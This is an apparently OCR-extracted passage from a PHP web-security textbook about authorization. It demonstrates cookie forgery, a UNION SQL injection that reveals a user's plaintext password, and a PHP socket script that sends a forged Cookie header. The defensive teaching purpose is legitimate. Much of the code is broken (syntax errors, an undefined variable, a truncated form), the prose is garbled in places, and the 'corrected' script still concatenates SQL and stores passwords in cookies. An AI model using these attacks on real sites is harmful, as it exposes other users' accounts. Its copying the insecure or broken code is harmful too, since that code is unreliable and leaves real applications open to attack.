
# 278 Part II: Solutions

```php
function generate_password($number)
{
    $arr = array('a', 'b', 'c', 'd', 'e', 'f', 'g',
        'h', 'i', 'j', 'k', 'l', 'm', 'n',
        'o', 'p', 'q', 'r', 's', 't', 'u',
        'v', 'w', 'x', 'y', 'z',
        'A', 'B', 'C', 'D', 'E', 'F', 'G',
        'H', 'I', 'J', 'K', 'L', 'M', 'N',
        'O', 'P', 'Q', 'R', 'S', 'T', 'U',
        'V', 'W', 'X', 'Y', 'Z',
        '1', '2', '3', '4', '5', '6',
        '7', '8', '9', '0',
        '!', '@', '#', '$', '%', '&', '*', '?',
        '<', '>', '/', '\', '|', '+', '-', '~');

    // Generating a password
    $pass = "";
    for($i = 0; $i < $number; $i++) {
        // Generating a random array element
        $index = rand(0, count($arr) - 1);
        $pass .= $arr[$index];
    }
    return $pass;
}
?>
```

## II.7.6. Protecting Text Files from Being Viewed in a Browser

Text files can be stopped from appearing in the browser by creating the .htaccess file shown in Listing II.7.11.

### Listing II.7.11. The .htaccess file

```apache
<Files "*.txt">
    deny from all
</Files>
```

# Chapter II.7: Authorization and Authentication 279

The *.txt mask in the Files container prohibits text files from all IP addresses from being viewed. Nevertheless, PHP scripts will be able to work with text files.

## II.7.7. Cookie-Based Authorization

The problem with the authorization script is that authorization occurs only once; only the cookie with the user's name is checked in all subsequent pages. This makes it easy to fake the cookie, which can be done using a browser (e.g., Opera, which has a cookie-editing feature) or programmatically. Registering in the system as a user (let it barton) and going through the authorization procedure installs a cookie on the client machine (Fig. II.7.7).

![](img/a893312ec68b8170fe567f785e95c06e_292_0.png)

Fig. II.7.7. Entering the system

Afterward, the cookie's name can be changed in Opera browser to any name registered in the system (Fig. II.7.8).

There are lots of programs and browsers with cookie-editing capabilities. Internet Explorer, however, is not one of them.

> NOTE

This makes the data belonging to the user whose name is in the doctored cookie (yandex, in this case) accessible to the perpetrator (Fig. II.7.9).

In addition making the other user's privileges accessible to the perpetrator, the counterfeit cookie makes it easy to learn this user's password, because an SQL query for selecting the user's personal data does not check the user name sent through a cookie. Recall the structure of the userslist table, shown in List-II.7.12.

![](img/a893312ec68b8170fe567f785e95c06e_293_0.png)

Fig. II.7.8. Changing the cookie's information in Opera browser

![](img/a893312ec68b8170fe567f785e95c06e_293_1.png)

Fig. II.7.9. Accessing another user's data

# Chapter II.7: Authorization and Authentication

Listing II.7.12. The structure of the userslist table

```sql
CREATE TABLE userslist (
  id int(11) NOT NULL auto_increment,
  name tinytext NOT NULL,
  pass tinytext NOT NULL,
  email tinytext NOT NULL,
  url tinytext NOT NULL,
  PRIMARY KEY (id)
  TYPE=MyISAM;
```

An SQL injection to display the user's password can look as shown in Listing II.7.13.

### Listing II.7.13. The SQL injection to display the password in the browser window

```sql
SELECT * FROM userslist
WHERE name = 'none'
UNION
SELECT id, name, pass, pass, url FROM userslist
WHERE name = 'yandex'
```

Replacing the user name with the string in bold will cause the password of the yandex user to be displayed instead of the email (Fig. II.7.10).

![](img/a893312ec68b8170fe567f785e95c06e_294_0.png)

**Fig. II.7.10.** Learning a user's password using an SQL injection

This example demonstrates once again that no data coming from a client machine can be trusted, including those set by the server side using mechanisms the user supposedly should not be familiar with: Everything can be faked, and sooner or later is. There are many malcontents of more varieties out there than you think. Even if you think that your personal Web site is of no interest to hackers and you don't have-

NOTE

# Part II: Solutions

worry about protecting it, sooner or later it will be broken into, even if for practice by some beginner hacker.

Using the browser to carry out this sort of break-in is quite interesting, but many users do not have the necessary cookie-editing tools within easy reach. In such a case, sockets can be used to edit cookies by sending the following counterfeit HTTP header to the server:

Cookie: user = user_name;

Here, user name is the value that the user cookie will receive. Cookie values must be passed through the urlencode() function to strip them of any national and special characters, which are not allowed in HTTP headers. A script implementing the SQL injection using an HTTP header is shown in Listing II.7.14.

### Listing II.7.14. Counterfeiting a cookie using an HTTP header

```php
<?php
$hostname = "localhost";
$path = "/test.php";
$sql = "SELECT id, name, pass, pass, url FROM userslist WHERE name = 'yandex'";

// Establishing a connection
$fp = fsockopen($hostname, 80, $errno, $errstr, 30);
if (!$fp) {
    echo $errstr;
} else {
    // Constructing the header
    $headers = "GET $path HTTP/1.1\r\n";
    $headers .= "Host: $hostname\r\n";
    // Counterfeiting the cookie
    $headers .= "Cookie: user=" . urlencode($user_name) . "\r\n";
    $headers .= "Connection: close\r\n";
    // Sending the request to the server
    fwrite($fp, $headers);
    // Receiving a reply from the server
    $line = "";
    while (!feof($fp)) {
      $line .= fgets($fp, 1024);
    }
    close($fp);
    echo $line;
?>
```

You should pay attention to the value of $path mentioned in Listing II.7.11.

![](img/a893312ec68b8170fe567f785e95c06e_296_0.png)

Fig. II.7.11. Carrying out SQL

Thus storing passwords in cookies is not enough; moreover, users should go through the authorization process every time they attempt to access restricted data services.

# 284 Part II: Solutions

# Listing II.7.15. The corrected script

```php
<?php
// If the user was successfully authorized,
// issuing a greeting
if(isset($_COOKIE['user']))
{
    // Connecting to the database
    require_once("config.php");
    // Processing the supplied password and login
    // with the escape_string() function
    // to protect against SQL injections

    if (!get_magic_quotes_gpc()) {
        $_COOKIE['user'] = mysql_escape_string($_COOKIE['user']);
        $_COOKIE['pass'] = mysql_escape_string($_COOKIE['pass']);
    }
    // Issuing a query that returns the number
    // of records that meet the login and
    // password criteria
    $query = "SELECT COUNT(*) FROM userslist WHERE name = '$_COOKIE[user]' AND pass = '$_COOKIE[pass]''";
    $usr = mysql_query($query);
    if (!$usr) exit("Authorization error!");
    // Obtaining the number of records
    $total = mysql_result($usr,0);
    if($total > 0)
    {
        // Displaying the greeting
        echo "Hello, "$_COOKIE['user']."<br>";
        echo "Here is your confidential data.<br>";
        // Displaying the user's data
        $query = "SELECT * FROM userslist WHERE name = '$_COOKIE[user]'";
        $usr = mysql_query($query);
        if(!$usr) exit(mysql_error());
    }
}
```

# Chapter II.7: Authorization and Authentication 285

```html
<form>
value = '<?php = $_COOKIE['user']; ?>'><br>
Password : <input type=password name=password value='><br>
<input type=submit value=Send>
</form>
<?php
// Reloading the page to reset the POST data
echo "<HTML><HEAD><META HTTP-EQUIV='Refresh';0; URL=";
```
